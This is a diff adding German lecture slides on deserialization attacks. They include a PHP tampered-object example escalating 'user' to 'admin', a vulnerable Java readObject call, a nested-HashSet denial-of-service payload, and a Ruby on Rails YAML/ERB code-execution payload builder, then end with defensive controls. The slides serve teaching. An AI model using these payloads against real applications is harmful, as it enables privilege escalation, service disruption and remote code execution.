@@ -351,5 +351,89 @@ if ("0" == "0eabcdefg") { // transforms to "0" == "0"
 }
 ```
 
+# Serilization Attacks
+
+## Was ist Serialisierung
+
+![Picture](0x08_serialization.jpg){.stretch}
+
+## Grundidee Angriff
+
+* Angreifer modifiziert das serialisierte Objekt
+* ..bringt den Deserialisierer zum Abstürzen
+* ..kann das deserialisierte Objekt modifizieren
+* ..kann potentiell Code ausführen
+
+## Client-Side State
+
+Am Beispiel [PHP](http://www.phpinternalsbook.com/php5/classes_objects/serialization.html)
+
+```
+a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
+
+# attack
+a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:5:"admin"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
+```
+
+## Java Serialization Attack
+
+* Problem: Objekt wird erst deserialisiert und danach erst überprüft
+* Falls ein Fehler bei der Deserialiserung passiert, dann wird dies zu spät abgefangen
+
+``` Java
+InputStream is = request.getInputStream();
+ObjectInputStream ois = new ObjectInputStream(is);
+AcmeObject acme = (AcmeObject)ois.readObject();
+```
+
+## Java Serilization Attack
+
+``` Java
+Set root = new HashSet();
+Set s1 = root;
+Set s2 = new HashSet();
+for (int i = 0; i < 100; i++) {
+  Set t1 = new HashSet();
+  Set t2 = new HashSet();
+  t1.add("foo"); // make it not equal to t2
+  s1.add(t1);
+  s1.add(t2);
+  s2.add(t1);
+  s2.add(t2);
+  s1 = t1;
+  s2 = t2;
+}
+```
+
+## Schlimmer: Code Execution
+
+* Über das deserilisierierte Objekt wird Code executed
+* Die verwendete Klasse muss im Zielsystem bekannt sein
+* Meistens werden Konstruktoren von häufigen Bibliotheken verwendet
+* Liste von Vektoren, z. B. [ysoserial](https://github.com/frohoff/ysoserial)
+
+## Ruby on Rails Serilialisierung
+
+```ruby
+code  = File.read(ARGV[1])
+
+# Construct a YAML payload wrapped in XML
+payload = <<-PAYLOAD.strip.gsub("\n", "&#10;")
+<fail type="yaml">
+--- !ruby/object:ERB
+  template:
+      src: !binary |-
+            #{Base64.encode64(code)}
+	    </fail>
+	    PAYLOAD
+```
+
+## Java Serialization Attack: Controls
+
+* Deserialiseriung nicht verwenden
+* Austauschen des Deserialisierers mit Custom Serializer (look-ahead)
+* Serialiserungsoperationen müssen authenticated und authorized sein
+* Serialisierte Objekte müssen integritätsgeschützt werden
+
 
 # FIN
